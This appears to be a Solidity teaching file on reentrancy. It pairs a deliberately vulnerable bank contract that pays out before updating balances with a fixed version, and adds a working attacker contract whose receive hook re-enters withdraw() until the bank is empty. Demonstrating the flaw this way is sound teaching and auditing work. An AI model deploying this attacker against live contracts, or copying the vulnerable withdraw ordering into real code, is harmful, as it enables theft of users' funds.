// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title Reentrancy: a bank that pays before it updates its books, and one that does not.
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "Nothing to withdraw");
        (bool ok, ) = msg.sender.call{value: amount}(""); // interaction first...
        require(ok, "Transfer failed");
        balances[msg.sender] = 0; // ...effect last: too late
    }
}

contract SafeBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender]; // checks
        require(amount > 0, "Nothing to withdraw");
        balances[msg.sender] = 0; // effects
        (bool ok, ) = msg.sender.call{value: amount}(""); // interactions
        require(ok, "Transfer failed");
    }
}

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Deposits once, then re-enters withdraw() from its receive hook until the bank is empty.
contract Attacker {
    IBank public immutable bank;
    uint256 public reentries;

    /// One event per re-entry, with what the bank still holds at that moment.
    event Reentered(uint256 depth, uint256 bankBalance);

    constructor(IBank b) {
        bank = b;
    }

    function attack() external payable {
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= msg.value && msg.value > 0) {
            reentries++;
            emit Reentered(reentries, address(bank).balance);
            bank.withdraw();
        }
    }
}
